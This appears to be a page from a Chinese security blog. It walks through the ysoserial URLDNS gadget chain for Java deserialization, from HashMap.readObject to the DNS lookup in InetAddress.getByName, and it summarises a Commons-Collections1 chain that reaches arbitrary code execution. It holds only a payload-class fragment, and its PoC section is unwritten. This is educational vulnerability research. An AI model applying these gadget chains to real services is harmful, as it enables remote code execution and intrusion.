<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>总结一下这部分的内容：首先利用的是Ysoserial的hashmap函数，实现反序列化，链条使用的类是commoncollections1中的，其中最重要的就是Transformed，可以调用一个函数，通过一系列操作，即可任意代码执行，但是值得一提的是，调用的类需要具有serialize接口，才能实现序列化。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/04/java_URLDNS/">java审计-反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-04</time><div class="content"><h2 id="readObject-writeObject"><a href="#readObject-writeObject" class="headerlink" title="readObject/writeObject"></a>readObject/writeObject</h2><p>java在序列化一个对象时，将会调用这个对象中的writeobject方法，参数类型是objectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readObject，开发者也可以从中读取出前面写入的内容，并进行处理</p>
<h2 id="ysoserial-URLDNS"><a href="#ysoserial-URLDNS" class="headerlink" title="ysoserial-URLDNS"></a>ysoserial-URLDNS</h2><p>gadget chains：利用链</p>
<p>URLDNS是ysoserial中一个利用链的名字，其结果是一次<strong>DNS请求</strong></p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>使用java内置的类构造，对第三方库没有依赖</li>
<li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>触发反序列化的方法是<code>readObject</code>，为了研究ysoserial中的这个利用链，我们从payload入手，其中写到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">	......</span><br><span class="line">	HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，在getObject中返回的被反序列化的对象是HashMap，因此接下来就是在这里打个断点，跟一下其过程</p>
<h4 id="如何使用ysoserial项目进行调试"><a href="#如何使用ysoserial项目进行调试" class="headerlink" title="如何使用ysoserial项目进行调试"></a>如何使用ysoserial项目进行调试</h4><p>打开工程，然后针对缺少的依赖，可以直接点击+号进行添加</p>
<p>接下来看一下pom.xml可以发现主类是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.GeneratePayload</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406112357.png" alt="img" style="zoom:67%;">

<p>接下来到这个主类这里进行分析，然后右键点击开始debug，在上面设置一下参数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145110.png" alt="image-20220406145109791"></p>
<p>可以发现已经跑起来了，并且在断点这里停下了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145152.png" alt="image-20220406145152006"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>URLDNS的getObject为反序列化的起点，所以来这里进行分析，发现其调用了HasMap()，并且这边注释到会链接到URL</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145550.png" alt="image-20220406145550294"></p>
<p>在hashmap函数中，我们首先看看反序列化方法readObject(),而其中比较特殊的点就在这里，在前面所说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The Java URL class has an interesting property on its equals and</span><br><span class="line"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="line"> *   during a comparison (either equals or hashCode).</span><br></pre></td></tr></table></figure>

<p>因此我们继续跟进这个函数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406183653.png" alt="image-20220406183653328"></p>
<p>可以发现，在hash函数调用了hashcode的方法，并且此时传入我们一开始设定的url</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406193918.png" alt="image-20220406193918163"></p>
<p>再往下，可以发现这里的handler是指向一个url类的（一开始我在这里下断点，但是初始化debug的时候，也会经过这里，而那个只是在寻找jar包，所以这里的key的属性就不同了，导致后面的handler指向的函数也不同，有很多同名函数）</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194122.png" alt="image-20220406194122333"></p>
<p>而此时的handler就会指向URLStreamHandler的hashCode方法，在这个hashcode方法中可以发现调用了getHostAddress</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194654.png" alt="image-20220406194654193"></p>
<p>继续跟进，可以发现调用了getByName</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194859.png" alt="image-20220406194859359"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次的Gadget流程如下:<br>1.HashMap-&gt;readObject()<br>2.HashMap-&gt;hash()<br>3.URL-&gt;hashCode()<br>4.URLStreamHandler-&gt;hashCode()<br>5.URLStreamHandler-&gt;getHostAddress()<br>6.InetAddress-&gt;getByName()</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>知道整条利用链以后，就要学习一下如何编写反序列化exp了，后面再来补坑</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>